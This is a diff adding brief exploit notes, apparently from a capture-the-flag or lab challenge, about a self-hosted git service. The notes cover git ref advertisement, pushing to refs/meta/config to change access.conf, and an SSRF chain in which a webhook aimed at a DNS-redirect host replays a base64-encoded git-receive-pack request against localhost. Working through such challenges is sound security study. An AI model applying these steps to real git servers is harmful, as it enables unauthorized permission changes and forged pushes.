@@ -1,0 +1,46 @@
+Brand new repo named "hey"
+
+git upload-pack --advertise-refs .
+00f2b2b3d722873e12c7c72c031ad37ed38d40021e7f HEADmulti_ack thin-pack side-band side-band-64k ofs-delta shallow deepen-since deepen-not deepen-relative no-progress include-tag multi_ack_detailed symref=HEAD:refs/heads/master agent=git/2.25.1
+003fb2b3d722873e12c7c72c031ad37ed38d40021e7f refs/heads/master
+0046b2b3d722873e12c7c72c031ad37ed38d40021e7f refs/remotes/origin/HEAD
+0048b2b3d722873e12c7c72c031ad37ed38d40021e7f refs/remotes/origin/master
+
+On push:
+
+0095b2b3d722873e12c7c72c031ad37ed38d40021e7f 1054032daff2e8d64743b72ade3b6e83979466f1 refs/heads/master
+
+1st number is commit hash of initial commit, 2nd number is commit hash of current commit
+Should be the same anyways, no need to worry about it?
+
+To make refs/meta/config:
+
+git push origin HEAD:refs/meta/config
+
+
+Exploit steps:
+
+(First, set correct github email and user to have matching hashes)
+
+Make an account with user "hack", pass "hack"
+Create repo with readme / same name
+
+$ git clone http://hack@localhost:1823/hack/hack.git
+$ echo "hack" > access.conf
+$ git add access.conf
+$ git commit -m "Updated permissions"
+$ git push origin HEAD:refs/meta/config     [CAPTURE THE POST REQUEST]
+
+Add a webhook on the hack repo pointing to DNS thing, redirecting to localhost
+Click "Register Webhook" button, CAPTURE REQUEST IN PROXY
+
+http://35.236.126.227/_/hack.git/git-receive-pack
+
+URL: http://coolwebhooker.h4ck.me/_/hack.git/git-receive-pack
+Body: HELLO THIS IS BODY (doesn't matter yet, make it recognizable)
+Type: Plain Text (doesn't matter, will change manually)
+
+Change the request, base64 encode the body of the previous request and put that as body
+Change contentType to application/x-git-receive-pack-request
+
+Then, make a change to the hack repo and push to trigger webhook
